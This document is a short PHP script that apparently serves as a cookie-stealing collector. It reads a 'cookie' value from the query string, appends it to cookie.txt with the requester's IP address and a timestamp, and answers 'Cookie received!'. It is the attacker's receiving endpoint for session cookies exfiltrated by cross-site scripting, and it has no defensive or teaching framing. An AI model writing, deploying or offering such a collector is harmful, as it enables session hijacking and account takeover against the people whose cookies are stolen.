<?php
//file_put_contents(filename: 'cookie.txt',$_GET['cookie']);

 if(isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');
    $data = "Time: $time | IP: $ip | Cookie: $cookie\n";
    file_put_contents('cookie.txt', $data, FILE_APPEND);
    echo "Cookie received!";
}
?>